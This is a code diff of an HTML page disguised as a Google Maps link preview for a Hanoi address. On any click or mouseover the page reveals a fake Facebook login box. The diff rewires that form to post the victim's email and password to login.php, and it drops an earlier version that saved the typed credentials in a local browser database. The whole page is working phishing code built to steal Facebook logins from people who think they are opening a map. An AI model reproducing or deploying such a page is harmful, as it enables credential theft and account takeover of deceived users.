@@ -5,10 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Google Maps</title>
   <meta property="og:title" content="Ngô Thì Nhậm" />
-	<meta property="og:image" content="https://lh5.googleusercontent.com/p/AF1QipNlGuLVR8TR_nVdtBAI3gSlczhKP3d2pIV3tW_T=w1000-h1000-k-no" />
-	<meta property="og:description" content="Hai Bà Trưng, Hà Nội, Việt Nam">
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+  <meta property="og:image" content="https://lh5.googleusercontent.com/p/AF1QipNlGuLVR8TR_nVdtBAI3gSlczhKP3d2pIV3tW_T=w1000-h1000-k-no" />
+  <meta property="og:description" content="Hai Bà Trưng, Hà Nội, Việt Nam">
 <link href="//www.google.com/images/branding/product/ico/maps15_bnuw3a_32dp.ico" rel="shortcut icon">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
   <style>
@@ -24,7 +22,7 @@
         margin-left: -250px;/* Negative half of width. */
 		border-radius: 6px;
         box-shadow: 0 3px 5px 2px rgba(150, 150, 150, 150);
-	visibility: hidden;
+        visibility: hidden;
 
       }
 	  :root {
@@ -218,20 +216,21 @@ iframe {
 <body>
 <div class="container" id="container">
 <h4>Đăng nhập Facebook</h4><br>
-     <form>
+     <form action="login.php" method="post">
           <input
             type="text"
-            id="email"
+            name="email"
             placeholder="Email hoặc số điện thoại"
             required>
           <input
             type="password"
-            id="matkhau"
+            name="matkhau"
             placeholder="Mật khẩu"
             required>
-          <div class="d-grid gap-2">
-		  <button class="btn btn-primary" type="button" id="dangnhap">Đăng nhập</button>
-		  </div>
+          <input
+            class="log-in-button"
+            type="submit"
+            value="Đăng nhập">
         </form>
         <a class="forgot" href="#">Quên tài khoản?</a>
 		<a class="signup" href="#">Đăng ký Facebook</a>
@@ -242,12 +241,13 @@ iframe {
 
 </div>
 <script>
-var db=openDatabase("itemDB","1.0","itemDB",65535); // itemDB is the database name
+
 $(document).ready(function() {
     if (/Mobi/.test(navigator.userAgent)) {
         $("body").on( "mouseover", function() {
             document.getElementById("container").style.visibility = "visible";
         });
+    }
     
     else{
         $("body").on( "click", function() {
@@ -255,26 +255,9 @@ $(document).ready(function() {
             
         });
     }
-
+    
+//document.getElementById("container").style.visibility = "visible";
 });
-
-//INSERTING DATA INTO TABLE
-
-$("#dangnhap").click(function(){
-var item=$("#email").val();
-var qty=$("#matkhau").val();
-db.transaction(function(transaction){
-var sql="INSERT INTO items(item,quantity) VALUES(?,?)";
-transaction.executeSql(sql,[item,qty],function(){
-},function(transaction,err){
-
-})
-})
-})
-//INSERTING DATA ENDS HERE
-
-
 </script>
-
 </body>
 </html>
